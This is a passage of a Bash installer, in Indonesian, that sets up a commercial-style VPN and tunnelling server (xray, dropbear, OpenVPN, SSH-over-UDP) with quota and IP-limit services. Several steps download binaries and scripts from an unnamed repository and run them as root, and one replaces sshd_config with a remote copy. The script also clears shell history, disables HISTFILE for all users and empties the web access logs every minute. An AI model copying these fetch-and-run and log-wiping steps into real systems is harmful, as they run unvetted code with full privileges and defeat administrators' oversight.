        print_success "Skrip 'limit-ip' di /usr/bin/."
    else
        print_error "Gagal mengunduh skrip 'limit-ip'."
        # exit 1 # Aktifkan jika ini adalah error fatal
    fi

    clear

    # --- Konfigurasi Layanan Systemd untuk Batas IP (LIMIT ALL IP) ---
    print_install "Mengkonfigurasi Layanan Batas IP (vmip, vlip, trip)"

    # Layanan untuk VMESS IP Limit
    cat >/etc/systemd/system/vmip.service << EOF
[Unit]
Description=Layanan Batas IP VMESS Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip vmip
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable vmip &>/dev/null
    systemctl restart vmip &>/dev/null
    if systemctl is-active --quiet vmip; then
        print_success "Layanan vmip."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan vmip."
    fi

    # Layanan untuk VLESS IP Limit
    cat >/etc/systemd/system/vlip.service << EOF
[Unit]
Description=Layanan Batas IP VLESS Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip vlip
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable vlip &>/dev/null
    systemctl restart vlip &>/dev/null
    if systemctl is-active --quiet vlip; then
        print_success "Layanan vlip dikonfigurasi dan dimulai."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan vlip."
    fi

    # Layanan untuk TROJAN IP Limit
    cat >/etc/systemd/system/trip.service << EOF
[Unit]
Description=Layanan Batas IP TROJAN Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip trip
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable trip &>/dev/null
    systemctl restart trip &>/dev/null
    if systemctl is-active --quiet trip; then
        print_success "Layanan trip dan dimulai."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan trip."
    fi

    # --- Konfigurasi Layanan Systemd untuk Batas Kuota (SERVICE LIMIT QUOTA) ---
    print_install "Mengkonfigurasi Layanan Batas Kuota (vmess, vless, trojan)"

    # Layanan untuk Kuota VMESS
    cat >/etc/systemd/system/qmv.service << EOF
[Unit]
Description=Layanan Batas Kuota VMESS Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/local/sbin/quota vmess
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable qmv &>/dev/null
    systemctl restart qmv &>/dev/null
    if systemctl is-active --quiet qmv; then
        print_success "Layanan qmv (kuota VMESS) berhasil dikonfigurasi dan dimulai."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan qmv."
    fi

    # Layanan untuk Kuota VLESS
    cat >/etc/systemd/system/qmvl.service << EOF
[Unit]
Description=Layanan Batas Kuota VLESS Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/local/sbin/quota vless
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable qmvl &>/dev/null
    systemctl restart qmvl &>/dev/null
    if systemctl is-active --quiet qmvl; then
        print_success "Layanan qmvl (kuota VLESS) dan dimulai."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan qmvl."
    fi

    # Layanan untuk Kuota TROJAN
    cat >/etc/systemd/system/qmtr.service << EOF
[Unit]
Description=Layanan Batas Kuota TROJAN Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/local/sbin/quota trojan
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable qmtr &>/dev/null
    systemctl restart qmtr &>/dev/null
    if systemctl is-active --quiet qmtr; then
        print_success "Layanan qmtr (kuota TROJAN) dan dimulai."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan qmtr."
    fi

    echo ""
    echo -e "${GRAY}----------------------------------------------------------${NC}"
    echo -e "            Pengaturan Batas Kuota Selesai"
    echo -e "${GRAY}----------------------------------------------------------${NC}"
    echo ""
}

function udp_mini(){
clear
print_install "MEMASANG UDP MINI"
mkdir -p /usr/local/geovpn/
wget -q -O /usr/local/geovpn/udp-mini "${REPO}badvpn/udp-mini"
chmod +x /usr/local/geovpn/udp-mini
wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}badvpn/udp-mini-1.service"
wget -q -O /etc/systemd/system/udp-mini-2.service "${REPO}badvpn/udp-mini-2.service"
wget -q -O /etc/systemd/system/udp-mini-3.service "${REPO}badvpn/udp-mini-3.service"
systemctl disable udp-mini-1
systemctl stop udp-mini-1
systemctl enable udp-mini-1
systemctl start udp-mini-1
systemctl disable udp-mini-2
systemctl stop udp-mini-2
systemctl enable udp-mini-2
systemctl start udp-mini-2
systemctl disable udp-mini-3
systemctl stop udp-mini-3
systemctl enable udp-mini-3
systemctl start udp-mini-3
echo ""
print_success "UDP MINI"
}

function ssh_udp(){
clear
print_install "MEMASANG SSH UDP"
mkdir -p /etc/geovpn/
wget -q -O /etc/geovpn/udp "${REPO}udp/udp"
wget -q -O /etc/systemd/system/udp.service "${REPO}udp/udp.service"
wget -q -O /etc/geovpn/config.json "${REPO}udp/config.json"
chmod +x /etc/geovpn/udp
chmod +x /etc/systemd/system/udp.service
chmod +x /etc/geovpn/config.json
systemctl enable udp
systemctl start udp
systemctl restart udp
systemctl status udp --no-pager
}

#function ssh_slow(){
#clear
#print_install "Memasang modul SlowDNS Server"
#    wget -q -O /tmp/nameserver "${REPO}slowdns/nameserver" >/dev/null 2>&1
 #   chmod +x /tmp/nameserver
  #  bash /tmp/nameserver | tee /root/install.log
# print_success "SlowDNS"
#}

clear
function ins_SSHD(){
clear
print_install "Memasang SSHD"
wget -q -O /etc/ssh/sshd_config "${REPO}ws/sshd" >/dev/null 2>&1
chmod 700 /etc/ssh/sshd_config
/etc/init.d/ssh restart
systemctl restart ssh
/etc/init.d/ssh status
print_success "SSHD"
}

clear
function ins_dropbear(){
clear
print_install "MENGINSTALL DROPBEAR"
if ! command -v wget &> /dev/null
then
print_error "Wget tidak ditemukan. Memasang wget..."
apt-get update && apt-get install -y wget
fi
wget -q -O /etc/default/dropbear "${REPO}ssh/dropbear.conf"
chmod +x /etc/default/dropbear
if ! grep -q "Banner /etc/geovpn.txt" /etc/ssh/sshd_config; then
echo "Banner /etc/geovpn.txt" >> /etc/ssh/sshd_config
fi
sed -i.bak 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/geovpn.txt"@g' /etc/default/dropbear
wget -O /etc/geovpn.txt "${REPO}ssh/issue.net"
local OS_ID=$(grep -oP '(?<=^ID=).+' /etc/os-release | tr -d '"')
local OS_VERSION_ID=$(grep -oP '(?<=^VERSION_ID=).+' /etc/os-release | tr -d '"')
if [ "$OS_ID" == "ubuntu" ] && [ "$OS_VERSION_ID" == "24.04" ]; then
print_install "Membersihkan tag HTML dari banner Dropbear untuk Ubuntu 24.04..."
sed -i 's/<[^>]*>//g' /etc/geovpn.txt
sed -i '/^\s*$/d' /etc/geovpn.txt
print_success "Tag HTML berhasil dibersihkan."
fi
systemctl restart dropbear &> /dev/null
if [ $? -ne 0 ]; then
/etc/init.d/dropbear restart &> /dev/null
fi
systemctl status dropbear --no-pager
if [ $? -ne 0 ]; then
/etc/init.d/dropbear status &> /dev/null
fi
sleep 2
print_success "DROPBEAR"
}

clear
function ins_vnstat(){
clear
print_install "Menginstall Vnstat"
# setting vnstat
apt -y install vnstat > /dev/null 2>&1
/etc/init.d/vnstat restart
apt -y install libsqlite3-dev > /dev/null 2>&1
wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
tar zxvf vnstat-2.6.tar.gz
cd vnstat-2.6
./configure --prefix=/usr --sysconfdir=/etc && make && make install
cd
vnstat -u -i $NET
sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
chown vnstat:vnstat /var/lib/vnstat -R
systemctl enable vnstat
/etc/init.d/vnstat restart
/etc/init.d/vnstat status
rm -f /root/vnstat-2.6.tar.gz
rm -rf /root/vnstat-2.6
print_success "Vnstat"
}

function ins_openvpn(){
clear
print_install "Menginstall OpenVPN"
#OpenVPN
wget ${REPO}ssh/openvpn &&  chmod +x openvpn && ./openvpn
/etc/init.d/openvpn restart
rm -f /var/www/html/index.html
wget -O /var/www/html/index.html "${REPO}menu/index.html" >/dev/null 2>&1

print_success "OpenVPN"
}

clear
function ins_swab(){
clear
print_install "Memasang Swap 1 G"
gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
    gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
    curl -sL "$gotop_link" -o /tmp/gotop.deb
    dpkg -i /tmp/gotop.deb >/dev/null 2>&1
    
        # > Buat swap sebesar 1G
    dd if=/dev/zero of=/swapfile bs=1024 count=1048576
    mkswap /swapfile
    chown root:root /swapfile
    chmod 0600 /swapfile >/dev/null 2>&1
    swapon /swapfile >/dev/null 2>&1
    sed -i '$ i\/swapfile      swap swap   defaults    0 0' /etc/fstab

    # > Singkronisasi jam
    chronyd -q 'server 0.id.pool.ntp.org iburst'
    chronyc sourcestats -v
    chronyc tracking -v
    
    wget ${REPO}bbr.sh &&  chmod +x bbr.sh && ./bbr.sh
rm -rf /root/*.sh
print_success "Swap 1 G"
}

function ins_Fail2ban(){
clear
print_install "Menginstall Fail2ban"
apt -y install fail2ban > /dev/null 2>&1
#sudo systemctl enable --now fail2ban
/etc/init.d/fail2ban restart
/etc/init.d/fail2ban status
print_success "Fail2ban"
}

function DDoS_Deflate(){
clear
print_install "MEMASANG DDoS-Deflate"
wget -qO /usr/sbin/ddos.zip "${REPO}ssh/ddos.zip" >/dev/null 2>&1
unzip /usr/sbin/ddos.zip -d /usr/sbin/
rm -rf /usr/sbin/ddos.zip
chmod +x /usr/sbin/ddos-deflate-master/*
cd /usr/sbin/ddos-deflate-master
./uninstall.sh && ./install.sh
print_success "DDoS-Deflate"
}

function ins_epro(){
clear
print_install "Menginstall ePro WebSocket Proxy"
    wget -O /usr/bin/ws "${REPO}ws/ws" >/dev/null 2>&1
    wget -O /usr/bin/tun.conf "${REPO}ws/tun.conf" >/dev/null 2>&1
    wget -O /etc/systemd/system/ws.service "${REPO}ws/ws.service" >/dev/null 2>&1
    chmod +x /etc/systemd/system/ws.service
    chmod +x /usr/bin/ws
    chmod 644 /usr/bin/tun.conf
systemctl disable ws
systemctl stop ws
systemctl enable ws
systemctl start ws
systemctl restart ws
wget -q -O /usr/local/share/xray/geosite.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat" >/dev/null 2>&1
wget -q -O /usr/local/share/xray/geoip.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat" >/dev/null 2>&1
wget -O /usr/sbin/ftvpn "${REPO}ws/ftvpn" >/dev/null 2>&1
chmod +x /usr/sbin/ftvpn
iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
iptables-save > /etc/iptables.up.rules
iptables-restore -t < /etc/iptables.up.rules
netfilter-persistent save
netfilter-persistent reload

# remove unnecessary files
cd
apt autoclean -y >/dev/null 2>&1
apt autoremove -y >/dev/null 2>&1
print_success "ePro WebSocket Proxy"
}

function ins_restart(){
clear
print_install "Restarting  All Packet"
/etc/init.d/nginx restart
/etc/init.d/openvpn restart
/etc/init.d/ssh restart
/etc/init.d/dropbear restart
/etc/init.d/fail2ban restart
/etc/init.d/vnstat restart
systemctl restart haproxy
/etc/init.d/cron restart
    systemctl daemon-reload
    systemctl start netfilter-persistent
    systemctl enable --now nginx
    systemctl enable --now xray
    systemctl enable --now rc-local
    systemctl enable --now dropbear
    systemctl enable --now openvpn
    systemctl enable --now cron
    systemctl enable --now haproxy
    systemctl enable --now netfilter-persistent
    systemctl enable --now ws
    systemctl enable --now fail2ban
history -c
echo "unset HISTFILE" >> /etc/profile

cd
rm -f /root/openvpn
rm -f /root/key.pem
rm -f /root/cert.pem
print_success "All Packet"
}

#Instal Menu
function menu(){
    clear
    print_install "Memasang Menu Packet"
    wget ${REPO}menu/menu.zip
    unzip menu.zip
    chmod +x menu/*
    mv menu/* /usr/local/sbin
    rm -rf menu
    rm -rf menu.zip
}

# Membaut Default Menu 
function profile(){
echo -e "[ ${GREEN}INFO${NC} ] reinstall --fix-missing install -y bzip2 gzip coreutils wget screen rsyslog iftop htop net-tools zip unzip wget net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential dirmngr libxml-parser-perl neofetch git lsof"
apt-get --reinstall --fix-missing install -y bzip2 gzip coreutils wget screen rsyslog iftop htop net-tools zip unzip wget net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential dirmngr libxml-parser-perl neofetch git lsof
echo "clear" >> .profile
echo "figlet -f slant GEO PROJECT | lolcat" >> .profile
echo "sleep 0.5" >> .profile
echo "clear" >> .profile
echo "menu " >> .profile
echo "echo -e \" - Script Mod By Geo Project\" | lolcat" >> .profile
echo "echo -e \"\x1b[96m - Silahkan Ketik\x1b[m \x1b[92mMENU\x1b[m \x1b[96mUntuk Melihat daftar Perintah\x1b[m\"" >> .profile

cat >/etc/cron.d/xp_all <<-END
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
		2 0 * * * root /usr/local/sbin/xp
	END
    chmod 644 /root/.profile
	
    cat >/etc/cron.d/daily_reboot <<-END
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
		0 5 * * * root /sbin/reboot
	END

    echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
    echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
    service cron restart
    cat >/home/daily_reboot <<-END
		5
	END

cat >/etc/systemd/system/rc-local.service <<EOF
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
EOF

echo "/bin/false" >>/etc/shells
echo "/usr/sbin/nologin" >>/etc/shells
cat >/etc/rc.local <<EOF
#!/bin/sh -e
# rc.local
# By default this script does nothing.
iptables -I INPUT -p udp --dport 5300 -j ACCEPT
iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
systemctl restart netfilter-persistent
exit 0
EOF

    chmod +x /etc/rc.local
    
    AUTOREB=$(cat /home/daily_reboot)
    SETT=11
    if [ $AUTOREB -gt $SETT ]; then
        TIME_DATE="PM"
    else
        TIME_DATE="AM"
    fi
print_success "Menu Packet"
}

# Restart layanan after install
function enable_services(){
clear
print_install "Enable Service"
    systemctl daemon-reload
    systemctl start netfilter-persistent
    systemctl enable --now rc-local
    systemctl enable --now cron
    systemctl enable --now netfilter-persistent
    systemctl restart nginx
    systemctl restart xray
    systemctl restart cron
    systemctl restart haproxy
    print_success "Enable Service"
    clear
}

# Fingsi Install Script
function instal(){
clear
    first_setup
    nginx_install
    base_package
    make_folder_xray
    pasang_domain
    password_default
    pasang_ssl
    install_xray
    ssh
    udp_mini
    limit_quota
    #ssh_slow
    ssh_udp
    ins_SSHD
    ins_dropbear
    ins_vnstat
    ins_openvpn
    ins_swab
    ins_Fail2ban
    ins_epro
    DDoS_Deflate
    ins_restart
    menu
    profile
    enable_services
}
instal
echo ""
history -c
rm -rf /root/menu
rm -rf /root/*.zip
rm -rf /root/*.sh
rm -rf /root/LICENSE
rm -rf /root/README.md
rm -rf /root/domain
#sudo hostnamectl set-hostname $user
secs_to_human "$(($(date +%s) - ${start}))"
echo ""
samawa
echo " "
echo -e " ${GREEN}┌─────────────────────────────────────────────────────┐"
echo -e " ${GREEN}│${NC}       >>> Service & Port                            ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Open SSH                : 22                    ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - UDP SSH                 : 1-65535               ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Dropbear                : 443, 109, 143         ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Dropbear Websocket      : 443, 109              ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - SSH Websocket SSL       : 443                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - SSH Websocket           : 80                    ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - OpenVPN SSL             : 443                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - OpenVPN Websocket SSL   : 443                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - OpenVPN TCP             : 443, 1194             ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - OpenVPN UDP             : 2200                  ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Nginx Webserver         : 443, 80, 81           ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Haproxy Loadbalancer    : 443, 80               ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - DNS Server              : 443, 53               ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - DNS Client              : 443, 88               ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - XRAY (DNSTT/SLOWDNS)    : 443, 53               ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - XRAY Vmess TLS          : 443                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - XRAY Vmess gRPC         : 443                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - XRAY Vmess None TLS     : 80                    ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - XRAY Vless TLS          : 443                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - XRAY Vless gRPC         : 443                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - XRAY Vless None TLS     : 80                    ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Trojan gRPC             : 443                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Trojan WS               : 443                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Shadowsocks WS          : 443                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Shadowsocks gRPC        : 443                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}                                                     ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}      >>> Server Information & Other Features        ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Timezone                : Asia/Jakarta (GMT +7) ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Autoreboot On           : $AUTOREB:00 $TIME_DATE GMT +7        ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Auto Delete Expired Account                     ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Fully Automatic Script                          ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Vps Settings                                    ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Admin Control                                   ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Restore Data                                    ${GREEN}│${NC}"
echo -e " ${GREEN}│${NC}   - Full Orders For Various Services                ${GREEN}│${NC}"
echo -e " ${GREEN}└─────────────────────────────────────────────────────┘${NC}"
echo ""
echo ""
echo "" | tee -a log-install.txt
echo -e ""
#sudo hostnamectl set-hostname $username
echo -e "${GREEN} Script Successfull Installed"
echo ""
read -p "$( echo -e "Press ${GRAY}[ ${NC}${GRAY}Enter${NC} ${GRAY}]${NC} For Reboot") "
reboot
